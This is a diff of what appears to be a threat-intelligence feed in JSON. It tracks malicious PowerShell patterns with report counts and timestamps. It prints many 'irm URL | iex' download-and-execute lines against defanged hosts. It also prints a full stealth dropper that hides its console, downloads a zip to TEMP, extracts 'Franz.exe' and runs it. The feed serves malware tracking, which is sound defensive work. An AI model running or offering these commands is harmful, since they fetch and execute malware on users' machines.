@@ -1,10 +1,10 @@
 [
   {
     "Pattern": "(irm '<URL>')|iex",
-    "DistinctPayloadCount": 94,
-    "ReportCount": 94,
+    "DistinctPayloadCount": 95,
+    "ReportCount": 95,
     "FirstSeen": "2026-11-19T04:56:29.394000+00:00",
-    "LastSeen": "2026-11-26T02:14:46.742000+00:00",
+    "LastSeen": "2026-11-26T02:35:10.816000+00:00",
     "ReportIds": [
       "cmwn2vd8k1uub0oml0r8kfv2r",
       "cmwn2veck1uuf0oml4fkuwp3j",
@@ -99,7 +99,8 @@
       "cmwwwfzju083p0omlzvig2wdi",
       "cmwwwutah08od0omljlhq0mb2",
       "cmwwwzkd108tk0omlqsud29or",
-      "cmwwx6daj09140omlbj2a6pwj"
+      "cmwwx6daj09140omlbj2a6pwj",
+      "cmwwxwlqs09tn0omljnpapkyh"
     ],
     "PayloadExamples": [
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/023cf003bfe9c9b9')|iex",
@@ -181,6 +182,7 @@
       "(irm 'https://j7tracker[.]gb[.]net/gabo58lfmx/0dad23cef5c6b0cc')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/gabo58lfmx/46d88f5544dd39f6')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/gabo58lfmx/aca3a98798ec3d08')|iex",
+      "(irm 'https://j7tracker[.]gb[.]net/gabo58lfmx/b2c44d0232aedd18')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/gabo58lfmx/ca3229b1985ab5e5')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/gabo58lfmx/e47acd3c810cfbb1')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/hn/6b4fae7bb06cf009')|iex",
@@ -561,9 +563,9 @@
   {
     "Pattern": "$url = \"<URL>\";\n$filename = \"Franz.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"G4spHKbT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
     "DistinctPayloadCount": 1,
-    "ReportCount": 17,
+    "ReportCount": 20,
     "FirstSeen": "2026-11-24T16:38:51.545000+00:00",
-    "LastSeen": "2026-11-26T02:19:24.234000+00:00",
+    "LastSeen": "2026-11-26T02:52:03.435000+00:00",
     "ReportIds": [
       "cmwux5vn3069i0nml8k905ktr",
       "cmwvic5jb0enp0nmlyqy9objn",
@@ -581,7 +583,10 @@
       "cmwwp497j05m50omly6v7b9s6",
       "cmwwwgc9m085h0omlkcf40buj",
       "cmwwwsblu08jp0omlkp95jw7g",
-      "cmwwxcbcm09810omlo5hpvabj"
+      "cmwwxcbcm09810omlo5hpvabj",
+      "cmwwy98ei0add0omlap6z4hor",
+      "cmwwybvod0agb0omloac6ivot",
+      "cmwwyib3y0aqw0omlw31agzle"
     ],
     "PayloadExamples": [
       "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Franz.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"G4spHKbT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit"
